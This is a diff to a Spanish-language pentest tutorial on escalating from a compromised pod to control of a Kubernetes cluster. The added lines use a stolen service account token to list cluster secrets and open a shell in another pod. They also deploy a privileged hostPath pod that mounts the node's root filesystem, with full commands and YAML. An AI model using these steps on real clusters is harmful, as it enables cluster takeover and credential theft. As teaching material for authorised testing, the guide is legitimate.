@@ -48,6 +48,9 @@ Hay varios indicios:
    ```
 
 
+Por defecto, Kubernetes crea variables de entorno que contienen el host y el puerto de otros servicios en ejecución en el cluster.
+
+
 ## Instalar kubectl
 
 `kubectl`es la herramienta que permite gestionar un cluster de Kubernetes. Por tanto, es imprescindible para poder ejecurtarlo en el pod comprometido.
@@ -156,6 +159,21 @@ $ ./kubectl auth can-i --list --token=$TOKEN
 
 *.*   []     [*]       []
 ...
+
+$ ./kubectl auth can-i create pods --token=$TOKEN
+
+$ ./kubectl get secrets --token=$TOKEN
+
+```
+La última instrucción enumera todos los `secrets` en el clúster de Kubernetes. Los ``secrets` son objetos de Kubernetes que almacenan información sensible, como claves API, contraseñas y certificados.
+
+Incluso podemos abrir sesión en el pod de grafana:
+```console
+
+$ ./kubectl exec -it grafana-123455-xyz --token=$TOKEN -- /bin/bash
+
+bash-5.1$ whoami
+grafana
 ```
 
 Prácticamente, ya somos administradores del cluster, pues ya es posible hacer casi cualquier cosa.
@@ -185,7 +203,7 @@ spec:
   containers:
   - name: everything-allowed-pod
     image: ubuntu
-    imagePullPolicy: IfNot>Present # añadir para que se descargue
+    imagePullPolicy: IfNotPresent # añadir para que se descargue
     securityContext:
       privileged: true
     volumeMounts:
@@ -209,13 +227,73 @@ pwncat$ upload ./privscal.yaml
 $ ./kubectl apply -f privscal.yaml --token=$TOKEN
 pod created
 ```
-Sin embargo, el pod no se está ejecutando porque no se puede descargar la imagen puesto que no se tiene acceso a internet para acceder al registro. 
+Sin embargo, el pod no se está ejecutando porque no se puede descargar la imagen ya que no se tiene acceso a internet para acceder al registro de imágenes. 
 ```console
 $ ./kubectl describe pod everything-allowed-exec-pod  --token=$TOKEN
 ...
 Failed to pull image "ubuntu" ...
 ...
 ```
+Tendremos que buscar una imagen entre las ya existentes
+
+```console
+$ ./kubectl --token=$TOKEN get pods --all-namespaces -o jsonpath="{.items[*].spec['containers'][*].image"
+```
+
+Si hay alguna imagen que nos pueda valer, se modifica el archivo `privscal.yaml` con la imagen, supongamos que es `syringe:latest` 
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: everything-allowed-exec-pod
+  labels:
+    app: pentest
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-pod
+    image: syringe:latest
+    imagePullPolicy: IfNotPresent # añadir para que se descargue
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+```
+
+
+```console
+
+$ ./kubectl delete pod everything-allowed-exec-pod  --token=$TOKEN # borramos primero el anterior
+$ ./kubectl apply -f privscal.yaml --token=$TOKEN
+
+
+$ ./kubectl get pods --token=$TOKEN # comprobar que se está ejecutando
+NAME                              READY
+everything-allowed-exec-pod         1/1        Running
+...
+```
+
+A nos podemos conectar a este pod recien creado y en ejecución:
+```console
+
+$ ./kubectl exec -it everything-allowed-exec-pod --token=$TOKEN -- /bin/bash
+
+```
+Aunque parece que seguimos en el mismo contendor, se ha montado en el directorio /host todo el sistema de archivos del huesped y hay acceso a todos los archivos y directorios del root.
+
+
+
 
 
 
